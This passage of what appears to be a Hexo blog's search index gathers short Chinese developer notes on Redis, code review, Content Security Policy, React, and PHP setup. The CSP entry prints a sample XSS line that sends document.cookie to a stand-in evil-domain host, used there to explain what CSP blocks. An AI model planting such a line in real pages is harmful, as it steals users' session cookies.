id="redis-redistemplate-KEY为字符串是多双引号的问题"><a href="#redis-redistemplate-KEY为字符串是多双引号的问题" class="headerlink" title="redis redistemplate KEY为字符串是多双引号的问题"></a>redis redistemplate KEY为字符串是多双引号的问题</h2><p>原因是 redistemplate 使用json进行序列化，需要对 key value 使用不同的序列化策略。</p><p>推荐使用如下配置</p><pre><code>@Configurationpublic class RedisConfiguration {    @Bean    public GenericJackson2JsonRedisSerializer genericJackson2JsonRedisJsonSerializer() {        return new GenericJackson2JsonRedisSerializer();    }    @Bean    RedisTemplate&lt;String, Object&gt; redisTemplate(JedisConnectionFactory jedisConnectionFactory) {        final RedisTemplate&lt;String, Object&gt; restTemplate = new RedisTemplate&lt;&gt;();        restTemplate.setConnectionFactory(jedisConnectionFactory);        restTemplate.setKeySerializer(new StringRedisSerializer());        restTemplate.setValueSerializer(genericJackson2JsonRedisJsonSerializer());        return restTemplate;    }}</code></pre><p>这里定义了 key 和 value 的序列化策略，如果需要使用更多的数据类型，需要添加适当的序列化策略。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>安全管理</title>
      <link href="/%E5%AE%89%E5%85%A8/security/security-management/"/>
      <url>/%E5%AE%89%E5%85%A8/security/security-management/</url>
      
        <content type="html"><![CDATA[<h2 id="网络威胁建模"><a href="#网络威胁建模" class="headerlink" title="网络威胁建模"></a>网络威胁建模</h2><p>微软的 Threat Modeling 是微软公司开发人员用于鉴别风险、并依据它作出更加设计、编码和测试决定的顶级安全分析方法学之一</p><p>Tool <a href="https://docs.microsoft.com/zh-cn/azure/security/azure-security-threat-modeling-tool-feature-overview" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/azure/security/azure-security-threat-modeling-tool-feature-overview</a></p><h2 id="跨功能安全需求"><a href="#跨功能安全需求" class="headerlink" title="跨功能安全需求"></a>跨功能安全需求</h2>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>代码审查的注意事项 （英文版）</title>
      <link href="/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/code-review-tips/"/>
      <url>/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/code-review-tips/</url>
      
        <content type="html"><![CDATA[<h2 id="通用-TIPS"><a href="#通用-TIPS" class="headerlink" title="通用 TIPS"></a>通用 TIPS</h2><ul><li>Naming should be correct and abide by the convention<ul><li>file convention </li><li>class convention </li><li>variable convention </li></ul></li><li>Hard code string and number should be refactored as constant </li><li>Keep all environment consistent </li><li>Should not expose password and private key<ul><li>Store sensitive data to environment </li><li>Store crendential to CI tool</li></ul></li><li>Remove useless comment and useless console statement </li><li>Remove any sensitive information in PROD</li><li>Remove useless file and method </li><li>Remove useless import </li><li>Import submodule as far as possible </li></ul><h2 id="Review-Java"><a href="#Review-Java" class="headerlink" title="Review Java"></a>Review Java</h2><ul><li>Should not use snapshot version </li><li>Null should be check when try to access attribute of it</li><li>Comparision should be use ‘equal’ instead of ‘==’</li><li>Util methods  should be static</li><li>Checkstyle should be turned on </li></ul><h2 id="Review-frontend"><a href="#Review-frontend" class="headerlink" title="Review frontend"></a>Review frontend</h2><ul><li>Eslint should be turned on </li><li>Component should be reused and context unrelated</li><li>Html should be sematic</li><li>Interface of component should be easy to use </li></ul>]]></content>
      
      
      <categories>
          
          <category> 敏捷开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Vue overview</title>
      <link href="/vue/vue/vue/"/>
      <url>/vue/vue/vue/</url>
      
        <content type="html"><![CDATA[<h2 id="VUE-核心特性"><a href="#VUE-核心特性" class="headerlink" title="VUE 核心特性"></a>VUE 核心特性</h2><h2 id="VUE-生态"><a href="#VUE-生态" class="headerlink" title="VUE 生态"></a>VUE 生态</h2><h3 id="UI框架"><a href="#UI框架" class="headerlink" title="UI框架"></a>UI框架</h3><ul><li>vuetifyjs</li><li>Mintui</li><li>Quasar</li><li>Vux</li></ul>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSP 浏览器内存安全策略</title>
      <link href="/%E5%AE%89%E5%85%A8/security/csp-in-browser/"/>
      <url>/%E5%AE%89%E5%85%A8/security/csp-in-browser/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是CSP"><a href="#什么是CSP" class="headerlink" title="什么是CSP?"></a>什么是CSP?</h2><p>这里一段定义是来自于MDN社区</p><blockquote><p>Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement or distribution of malware.</p></blockquote><p>内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。</p><p>参考来源</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a></p><h2 id="使用CSP的两种方式"><a href="#使用CSP的两种方式" class="headerlink" title="使用CSP的两种方式"></a>使用CSP的两种方式</h2><ul><li>通过服务器 HTTP 头部的 Content-Security-Policy 来指定</li><li><p>通过 HTML 文档的 meta 标签配置策略</p><p>例如：</p><p>使用 HTTP 头部，这里的 policy 为策略字符串</p><pre><code>Content-Security-Policy: policy</code></pre></li></ul><p>使用 HTML meta 标签的方式</p><pre><code class="HTML">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; img-src https://*; child-src &#39;none&#39;;&quot;&gt;</code></pre><h2 id="主要防范目标"><a href="#主要防范目标" class="headerlink" title="主要防范目标"></a>主要防范目标</h2><p> CSP主要是防范 XSS 攻击，以及报告 XSS 攻击，如果页面存在漏洞让 JS 脚本注入，CSP 能限制脚本的运行，然后把损失降到最小</p><pre><code class="Javascript"> (new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</code></pre><p> CSP 是通过限制加载到页面上的资源、域或者协议来实现的，例如，一旦入侵者找到漏洞注入了XSS攻击，入侵者可以通过 图片Ping的方式发送敏感信息到外部网站。CSP 可以指定允许信任域名下的图片、Script和样式表被加载到页面上，及时入侵者 XSS 入侵成功也无法通过这些方式发送数据，保证网站一定程度上安全。</p><p> TODO 几个例子限制加载的资源</p><p>另外 CSP 也提供了只允许加载指定协议，例如HTTPS的资源，否则自动跳转到 HTTPS 版本。</p><h2 id="使用-CSP"><a href="#使用-CSP" class="headerlink" title="使用 CSP"></a>使用 CSP</h2><p>当我们需要使用CSP生效就需要编写相应的策略，策略包括一系列指令组成和设置定的值组成。</p><p>例如，一个网站管理者允许内容来自信任的域名及其子域名 </p><pre><code>Content-Security-Policy: default-src &#39;self&#39; *.trusted.com</code></pre><p>我们再看一条策略：</p><pre><code>Content-Security-Policy: default-src &#39;self&#39;; img-src *; media-src media1.com media2.com; script-src userscripts.example.com</code></pre><p>这条策略有4个指令 img-src 为图片资源，media-src 为视频媒体资源，script-src 为脚本资源。最重要的一个是 default-src 为所有的资源默认属性，这里设置为了 ‘self’ 的含义为所有的资源再不指定的情况下只能从自身域下加载。</p><p>TODO 描述 行内脚本</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><host-source></host-source></p><p><scheme-source><br>    self<br>    unsafe-inline<br>    unsafe-eva<br>    none<br>    nonce-&lt;base64值&gt;<br>    strict-dynamic</scheme-source></p><p>### </p><p> TODO 讲解这几种模式</p><h2 id="报告违规情况"><a href="#报告违规情况" class="headerlink" title="报告违规情况"></a>报告违规情况</h2><p>CSP 提供了另外一个非常有用的模式 - 报告模式，如果在 HTTP 头部指定 Content-Security-Policy-Report-Only 可以将发生了任何违规的事件都会被报告出去，但是这个头部只会对报告生效，实际生效还是需要 在Content-Security-Policy 中指定。</p><p>在报告的策略中需要配置一个 report-uri 用于服务器接受违规报告情况，例如：</p><pre><code>Content-Security-Policy: default-src &#39;self&#39;; report-uri http://reportcollector.example.com/collector.cgi</code></pre><p>浏览器会向 report-uri 中指定的地址使用 POST 发送一个 JSON 格式的数据包。</p><p>数据包格式如下：</p><pre><code class="JSON">{  &quot;csp-report&quot;: {    &quot;document-uri&quot;: &quot;http://example.com/signup.html&quot;,    &quot;referrer&quot;: &quot;&quot;,    &quot;blocked-uri&quot;: &quot;http://example.com/css/style.css&quot;,    &quot;violated-directive&quot;: &quot;style-src cdn.example.com&quot;,    &quot;original-policy&quot;: &quot;default-src &#39;none&#39;; style-src cdn.example.com; report-uri /_/csp-reports&quot;  }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>开发工具图谱</title>
      <link href="/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/development%20tool/"/>
      <url>/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/tool/development%20tool/</url>
      
        <content type="html"><![CDATA[<h2 id="开发工具"><a href="#开发工具" class="headerlink" title="开发工具"></a>开发工具</h2><ul><li><p>编辑器</p><ul><li>VIM </li><li>Sublime </li></ul></li><li><p>VCS </p><ul><li>SVN </li><li>GIT</li></ul></li><li><p>IDE</p><ul><li>IntelliJ IDEA</li></ul></li><li><p>抓包工具</p><ul><li>Httpwatch</li><li>Wireshark</li><li>fiddler</li></ul></li><li><p>性能分析工具</p><ul><li>AB测试</li><li>网页性能分析</li><li>JMH 性能测试</li><li>zerocode 性能测试 in code</li></ul></li></ul><h2 id="设计展现工具"><a href="#设计展现工具" class="headerlink" title="设计展现工具"></a>设计展现工具</h2><ul><li><a href="https://mural.co/" target="_blank" rel="noopener">https://mural.co/</a> 在线协作绘图</li><li><a href="https://www.draw.io/" target="_blank" rel="noopener">https://www.draw.io/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 开发工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>超实用的工具和网站收集</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/tool-collections/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/tool-collections/</url>
      
        <content type="html"><![CDATA[<h2 id="流程图、思维导图"><a href="#流程图、思维导图" class="headerlink" title="流程图、思维导图"></a>流程图、思维导图</h2><p><a href="https://www.processon.com" target="_blank" rel="noopener">https://www.processon.com</a></p><p>可以绘制思维导图、流程图、ER图等</p><p><a href="https://coggle.it/" target="_blank" rel="noopener">https://coggle.it/</a></p><p>超漂亮的思维导图工具</p><p><img src="/职业素质/profession/tool-collections/coggle.png" alt=""></p><p><a href="http://naotu.baidu.com/" target="_blank" rel="noopener">http://naotu.baidu.com/</a></p><p>百度脑图</p><h2 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h2><p><a href="https://octodex.github.com/" target="_blank" rel="noopener">https://octodex.github.com/</a></p><p>github章鱼头像</p>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>API的contract测试之Pact</title>
      <link href="/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/contract-testing%20&amp;%20PACT/"/>
      <url>/%E8%B4%A8%E9%87%8F%E4%BF%9D%E8%AF%81/test/contract-testing%20&amp;%20PACT/</url>
      
        <content type="html"><![CDATA[<h2 id="why"><a href="#why" class="headerlink" title="why?"></a>why?</h2><p>当我们构建API的时候，需要保证API输出稳定，因此我们可以使用契约测试。<br>我们可以定义一个契约文件，然后消费者和API提供者并行开发，最终进行集成测试。</p><h2 id="pact-和-contact的区别"><a href="#pact-和-contact的区别" class="headerlink" title="pact 和 contact的区别"></a>pact 和 contact的区别</h2><p>pact 是contact测试的一个实现</p><h2 id="我的一个契约测试的例子"><a href="#我的一个契约测试的例子" class="headerlink" title="我的一个契约测试的例子"></a>我的一个契约测试的例子</h2><ul><li><a href="https://github.com/domain-driven-design/contract-testing-mockmvc" target="_blank" rel="noopener">https://github.com/domain-driven-design/contract-testing-mockmvc</a></li></ul><h2 id="一些资源"><a href="#一些资源" class="headerlink" title="一些资源"></a>一些资源</h2><ul><li>pact文档 <a href="https://docs.pact.io" target="_blank" rel="noopener">https://docs.pact.io</a></li><li>Java 例子 <a href="https://github.com/DiUS/pact-workshop-jvm" target="_blank" rel="noopener">https://github.com/DiUS/pact-workshop-jvm</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 质量保证 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React Native 资源收集</title>
      <link href="/React/react/react-native%20resource/"/>
      <url>/React/react/react-native%20resource/</url>
      
        <content type="html"><![CDATA[<p>官网</p><p><a href="https://facebook.github.io/react-native/" target="_blank" rel="noopener">https://facebook.github.io/react-native/</a></p><p>React Native 开发工具</p><p><a href="https://expo.io/" target="_blank" rel="noopener">https://expo.io/</a></p><p>React Native 组件</p><p><a href="https://react-native-training.github.io/react-native-elements/" target="_blank" rel="noopener">https://react-native-training.github.io/react-native-elements/</a></p><p>React Native 脚手架</p><p><a href="https://github.com/react-community/create-react-native-app" target="_blank" rel="noopener">https://github.com/react-community/create-react-native-app</a></p><p>React Native 项目案例</p><ul><li>CNode,推荐学习 <a href="https://github.com/soliury/noder-react-native" target="_blank" rel="noopener">https://github.com/soliury/noder-react-native</a></li></ul><p>React Native boilerplate</p><p><a href="https://github.com/linksgo2011/react-native-ts-most" target="_blank" rel="noopener">https://github.com/linksgo2011/react-native-ts-most</a></p><p>React Native project deployment</p>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React学习体系</title>
      <link href="/react/react/react-crouse%20map/"/>
      <url>/react/react/react-crouse%20map/</url>
      
        <content type="html"><![CDATA[<h2 id="参考的几家课程体系："><a href="#参考的几家课程体系：" class="headerlink" title="参考的几家课程体系："></a>参考的几家课程体系：</h2><ul><li><a href="http://www.zhufengpeixun.cn/react/index.html" target="_blank" rel="noopener">http://www.zhufengpeixun.cn/react/index.html</a> </li><li><a href="http://www.jikexueyuan.com/course/reactjs/" target="_blank" rel="noopener">http://www.jikexueyuan.com/course/reactjs/</a></li><li><a href="https://roadtoreact.com/course-details?courseId=THE_ROAD_TO_LEARN_REACT" target="_blank" rel="noopener">https://roadtoreact.com/course-details?courseId=THE_ROAD_TO_LEARN_REACT</a></li></ul><h2 id="课程列表"><a href="#课程列表" class="headerlink" title="课程列表"></a>课程列表</h2><ol><li>环境搭建和ES基础<ul><li>前端开发历史沿革</li><li>开发环境</li><li>Gitflow工作流</li><li>ES6新特性介绍</li></ul></li><li>webpack工程化前端项目<ul><li>Webpack的使用</li><li>Babel使用</li><li>测试环境的准备</li><li>JS linter</li><li>Webpack各种Loader配置</li></ul></li><li>React基础<ul><li>React基本思想</li><li>JSX语法</li><li>组件生命周期</li><li>Children使用场景</li><li>高阶组件</li></ul></li><li>React生态和周边工具库<ul><li>react-router前端路由管理</li><li>React中表单数据收集、验证、回写</li><li>React文件上传</li><li>React其他开源组件使用</li><li>Enzyme测试React组件</li><li>React组件文档工具storybook</li></ul></li><li>Redux管理以及API集成<ul><li>理解redux</li><li>react-redux使用</li><li>Logger中间件</li><li>Tthunk中间件实现异步action</li><li>Redux调试工具</li></ul></li><li>CI/CD部署上线以及版本管理<ul><li>CI工具介绍</li><li>多环境配置</li><li>使用semantic-release进行版本管理</li><li>私有仓库</li></ul></li></ol><p>PS: 测试和项目实践贯穿整个过程</p>]]></content>
      
      
      <categories>
          
          <category> react </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React 资源收集</title>
      <link href="/React/react/react-recource/"/>
      <url>/React/react/react-recource/</url>
      
        <content type="html"><![CDATA[<p>React js 后端界面<br><a href="https://marmelab.com/admin-on-rest/Admin.html" target="_blank" rel="noopener">https://marmelab.com/admin-on-rest/Admin.html</a></p><p>React 测试工具</p><p><a href="https://github.com/airbnb/enzyme" target="_blank" rel="noopener">https://github.com/airbnb/enzyme</a></p><p>React 状态管理库</p><p><a href="https://github.com/reactjs/react-redux" target="_blank" rel="noopener">https://github.com/reactjs/react-redux</a></p><p>React 脚手架</p><p><a href="https://github.com/facebookincubator/create-react-app" target="_blank" rel="noopener">https://github.com/facebookincubator/create-react-app</a></p><p>React 组件库(无UI)</p><p>rc-*</p><p><a href="http://react-component.github.io/badgeboard/" target="_blank" rel="noopener">http://react-component.github.io/badgeboard/</a></p><p>Here is a list of react-component: <a href="http://react-component.github.io/badgeboard/" target="_blank" rel="noopener">http://react-component.github.io/badgeboard/</a></p><p>React component documentation tool story book</p><p><a href="https://github.com/storybooks/storybook" target="_blank" rel="noopener">https://github.com/storybooks/storybook</a></p><p>React UI和组件库</p><ul><li><a href="https://ant.design/" target="_blank" rel="noopener">https://ant.design/</a></li><li><a href="http://amazeui.org/" target="_blank" rel="noopener">http://amazeui.org/</a></li><li><a href="https://onsen.io/react/" target="_blank" rel="noopener">https://onsen.io/react/</a></li></ul><p>React boilerplate</p>]]></content>
      
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>React router 登录验证方案</title>
      <link href="/react/react/React+Redux+React%20router%20authentication/"/>
      <url>/react/react/React+Redux+React%20router%20authentication/</url>
      
        <content type="html"><![CDATA[<p>使用 react 高阶函数<br><a href="https://github.com/joshgeller/react-redux-jwt-auth-example" target="_blank" rel="noopener">https://github.com/joshgeller/react-redux-jwt-auth-example</a></p><pre><code>router.jsimport {HomeView, LoginView, ProtectedView} from &#39;../views&#39;;import {requireAuthentication} from &#39;../components/AuthenticatedComponent&#39;;export default(    &lt;Route path=&#39;/&#39; component={App}&gt;        &lt;IndexRoute component={HomeView}/&gt;        &lt;Route path=&quot;login&quot; component={LoginView}/&gt;        &lt;Route path=&quot;protected&quot; component={requireAuthentication(ProtectedView)}/&gt;    &lt;/Route&gt;);</code></pre><pre><code>import React from &#39;react&#39;;import {connect} from &#39;react-redux&#39;;import {pushState} from &#39;redux-router&#39;;export function requireAuthentication(Component) {    class AuthenticatedComponent extends React.Component {        componentWillMount() {            this.checkAuth();        }        componentWillReceiveProps(nextProps) {            this.checkAuth();        }        checkAuth() {            if (!this.props.isAuthenticated) {                let redirectAfterLogin = this.props.location.pathname;                this.props.dispatch(pushState(null, `/login?next=${redirectAfterLogin}`));            }        }        render() {            return (                &lt;div&gt;                    {this.props.isAuthenticated === true                        ? &lt;Component {...this.props}/&gt;                        : null                    }                &lt;/div&gt;            )        }    }    const mapStateToProps = (state) =&gt; ({        token: state.auth.token,        userName: state.auth.userName,        isAuthenticated: state.auth.isAuthenticated    });    return connect(mapStateToProps)(AuthenticatedComponent);}</code></pre>]]></content>
      
      
      <categories>
          
          <category> react </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Python 入门</title>
      <link href="/python/python/python-basic/"/>
      <url>/python/python/python-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><p>入门教程： <a href="http://www.runoob.com/python/python-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-tutorial.html</a></p><h2 id="Python-是什么？"><a href="#Python-是什么？" class="headerlink" title="Python 是什么？"></a>Python 是什么？</h2><p>Python 是一个高层次的结合了解释性、编译性、互动性和面向对象的脚本语言。<br>Python 的设计具有很强的可读性，相比其他语言经常使用英文关键字，其他语言的一些标点符号，它具有比其他语言更有特色语法结构。</p><ul><li>Python 是一种解释型语言： 这意味着开发过程中没有了编译这个环节。类似于PHP和Perl语言。</li><li>Python 是交互式语言： 这意味着，您可以在一个Python提示符，直接互动执行写你的程序。</li><li>Python 是面向对象语言: 这意味着Python支持面向对象的风格或代码封装在对象的编程技术。</li><li>Python 是初学者的语言：Python 对初级程序员而言，是一种伟大的语言，它支持广泛的应用程序开发，从简单的文字处理到 WWW 浏览器再到游戏。</li></ul><h2 id="安装-Python-in-Mac"><a href="#安装-Python-in-Mac" class="headerlink" title="安装 Python in Mac"></a>安装 Python in Mac</h2><p><a href="https://www.python.org/downloads/" target="_blank" rel="noopener">https://www.python.org/downloads/</a><br>推荐使用版本为2.7</p><h2 id="进入交互模式"><a href="#进入交互模式" class="headerlink" title="进入交互模式"></a>进入交互模式</h2><p>linux上你只需要在命令行中输入 Python 命令即可启动交互式编程</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP拓展和使用C编写自定义拓展</title>
      <link href="/php/php/php-plugin-c/"/>
      <url>/php/php/php-plugin-c/</url>
      
        <content type="html"><![CDATA[<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>PHP的一个拓展方法就是使用C来编写PHP插件,可以带来极大的性能提升和实现系统层面的拓展。推荐使用C来编写,但是C++特性更为丰富并且有大量的库来支持我们的任务,因此C++也是更好的选择。</p><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><ul><li>PHP 源码解读和插件编写基本知识 <a href="http://www.php-internals.com/" target="_blank" rel="noopener">http://www.php-internals.com/</a></li><li>C++库用于简化插件编写 <a href="https://github.com/rioderelfte/php-cpp-extension" target="_blank" rel="noopener">https://github.com/rioderelfte/php-cpp-extension</a></li><li>V8引擎插件 <a href="https://github.com/phpv8/v8js" target="_blank" rel="noopener">https://github.com/phpv8/v8js</a></li><li>基于php-cpp的Qr code插件 <a href="https://github.com/Leon2012/phpqrencode" target="_blank" rel="noopener">https://github.com/Leon2012/phpqrencode</a></li><li>PHP MVC框架的拓展实现 <a href="https://github.com/phalcon/cphalcon" target="_blank" rel="noopener">https://github.com/phalcon/cphalcon</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CakePHP 资源收集</title>
      <link href="/php/php/cakephp%20resource/"/>
      <url>/php/php/cakephp%20resource/</url>
      
        <content type="html"><![CDATA[<p>akePHP is a rapid development framework for PHP which uses commonly known design patterns like Active Record, Association Data Mapping, Front Controller and MVC. Our primary goal is to provide a structured framework that enables PHP users at all levels to rapidly develop robust web applications, without any loss to flexibility.</p><p>The Cake Software Foundation - promoting development related to CakePHP<br><a href="http://cakefoundation.org/" target="_blank" rel="noopener">http://cakefoundation.org/</a></p><p>CakePHP - the rapid development PHP framework<br><a href="http://www.cakephp.org" target="_blank" rel="noopener">http://www.cakephp.org</a></p><p>Cookbook - user documentation for learning about CakePHP<br><a href="http://book.cakephp.org" target="_blank" rel="noopener">http://book.cakephp.org</a></p><p>API - quick reference to CakePHP<br><a href="http://api.cakephp.org" target="_blank" rel="noopener">http://api.cakephp.org</a></p><p>The Bakery - everything CakePHP<br><a href="http://bakery.cakephp.org" target="_blank" rel="noopener">http://bakery.cakephp.org</a></p><p>The Show - live and archived podcasts about CakePHP and more<br><a href="http://live.cakephp.org" target="_blank" rel="noopener">http://live.cakephp.org</a></p><p>CakePHP TV - screen casts from events and video tutorials<br><a href="http://tv.cakephp.org" target="_blank" rel="noopener">http://tv.cakephp.org</a></p><p>CakePHP Google Group - community mailing list and forum<br><a href="http://groups.google.com/group/cake-php" target="_blank" rel="noopener">http://groups.google.com/group/cake-php</a></p><p>#cakephp on irc.freenode.net - chat with CakePHP developers<br>irc://irc.freenode.net/cakephp</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP 包管理工具</title>
      <link href="/php/php/PHP-package%20manager/"/>
      <url>/php/php/PHP-package%20manager/</url>
      
        <content type="html"><![CDATA[<p>PHP中可以使用的包管理工具为 composer<br>官网:<a href="https://getcomposer.org" target="_blank" rel="noopener">https://getcomposer.org</a></p><p>安装:<a href="https://getcomposer.org/download/" target="_blank" rel="noopener">https://getcomposer.org/download/</a></p><p>安装composer</p><blockquote><p>php -r “copy(‘<a href="https://getcomposer.org/installer&#39;" target="_blank" rel="noopener">https://getcomposer.org/installer&#39;</a>, ‘composer-setup.php’);”</p></blockquote><blockquote><p>php -r “if (hash_file(‘SHA384’, ‘composer-setup.php’) === ‘669656bab3166a7aff8a7506b8cb2d1c292f042046c5a994c43155c0be6190fa0355160742ab2e1c88d40d5be660b410’) { echo ‘Installer verified’; } else { echo ‘Installer corrupt’; unlink(‘composer-setup.php’); } echo PHP_EOL;”</p></blockquote><blockquote><p>php composer-setup.php</p></blockquote><blockquote><p>php -r “unlink(‘composer-setup.php’);”</p></blockquote><p>浏览PHP包:</p><p><a href="http://packagist.org" target="_blank" rel="noopener">http://packagist.org</a></p><p>使用composer</p><p>在工作目录下添加composer.json</p><pre><code>{    &quot;name&quot;: &quot;cakephp-boilerplate&quot;,    &quot;require&quot;: {        &quot;cakephp/cakephp&quot;: &quot;2.9.*&quot;    },    &quot;config&quot;: {        &quot;vendor-dir&quot;: &quot;Vendor/&quot;    }}</code></pre><blockquote><p>php composer.phar install</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP环境 in Mac</title>
      <link href="/php/php/php-environment-in-mac/"/>
      <url>/php/php/php-environment-in-mac/</url>
      
        <content type="html"><![CDATA[<p>实际上Mac系统自带了PHP和Apache的开发环境</p><p>1、Apache相关</p><p>Mac系统自带apache服务器，我们只需要配置相关信息并进行开启服务即可</p><p>sudo vim /etc/apache2/httpd.conf</p><p>打开对PHP的支持,第169行左右</p><p>LoadModule php5_module libexec/apache2/libphp5.so</p><p>2、测试</p><p>系统默认会访问／Library/WebServer/Document/index.html.en文件</p><p>为了方便测试，在此目录下新建一个test.php文件，并输入</p><pre><code class="php">&lt;?phpphpinfo(); ?&gt;</code></pre><p>然后访问localhost/test.php，会直接打印出phpinfo中的各种信息</p><p>3、PHP配置</p><p>在做第二步测试的时候，扩展里面date会出现错误，原因是默认php.ini没有对date.timezone进行设置，系统默认UTC的时区，所以我们要开启对php.ini的设置</p><p>sudo cp /etc/php.ini.default php.ini</p><p>先把默认配置文件复制一份，然后给复制好的配置文件增加写的权限</p><p>sudo chmod +w php.ini</p><p>找到date.timezone，先把默认的注释给删除掉，然后直接后面配置成PRC即可</p><p>4、测试</p><p>再次访问localhost/test.php，date扩展就OK了！</p><p>使用自带的Apache</p><p>sudo apachectl start</p><p>sudo apachectl stop</p><p>sudo apachectl restart</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CakePHP 脚手架和命令行工具</title>
      <link href="/php/php/cakephp%20scaffold/"/>
      <url>/php/php/cakephp%20scaffold/</url>
      
        <content type="html"><![CDATA[<p>CakePHP提供了一个bake命令行工具,提供了一套代码创建命令行工具,可以根据数据库创建模型和控制器视图等。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PHP 不同场景下技术选型的讨论</title>
      <link href="/php/php/lightweight%20php%20api/"/>
      <url>/php/php/lightweight%20php%20api/</url>
      
        <content type="html"><![CDATA[<h2 id="构建独立的API应用"><a href="#构建独立的API应用" class="headerlink" title="构建独立的API应用"></a>构建独立的API应用</h2><p>不使用框架而搭建轻量级灵活的API接口，满足基本业务需求要求拓展性好。</p><h3 id="技术选型"><a href="#技术选型" class="headerlink" title="技术选型"></a>技术选型</h3><ul><li>Composer 包管理工具</li><li>ToroPHP PHP路由框架</li><li>Medoo PHP数据库ORM框架</li><li>Monolog 日志框架</li><li>JWT token消费和验证</li></ul><h2 id="构建小型企业网站"><a href="#构建小型企业网站" class="headerlink" title="构建小型企业网站"></a>构建小型企业网站</h2><p>推荐使用 <a href="http://www.x6cms.com/" target="_blank" rel="noopener">x6cms</a> 这个cms的好处是构建了一个非常简单和完善的管理系统，该cms使用了CI框架开发</p><h2 id="构建微信应用"><a href="#构建微信应用" class="headerlink" title="构建微信应用"></a>构建微信应用</h2><p>推荐使用微擎，phpWechat</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mac 环境下使用MAMP安装PHP环境</title>
      <link href="/php/php/php-mamp/"/>
      <url>/php/php/php-mamp/</url>
      
        <content type="html"><![CDATA[<p>下载安装MAMP</p><p><a href="https://www.mamp.info/en/mamp-pro/" target="_blank" rel="noopener">https://www.mamp.info/en/mamp-pro/</a></p><p>设置默认的PHP为MAMP</p><blockquote><p>export PATH=”/Applications/MAMP/bin/php/php5.5.38/bin:$PATH”</p></blockquote><p>另一种方法更为简便,为MAMP的PHP设置一个别名即可</p><blockquote><p>alias phpmamp=/Applications/MAMP/bin/php/php5.5.38/bin/php</p></blockquote><p>破解安装更多版本的PHP</p><p>MAMP PRO 提供了更多的PHP版本选择,但是MAMP只提供了2个,实际上在MAMP安装目录下有多个PHP版本我们可以删除一些无用的PHP版本即可。</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Ubuntu上的MySQL安装</title>
      <link href="/mysql/mysql/mysql-configuration/"/>
      <url>/mysql/mysql/mysql-configuration/</url>
      
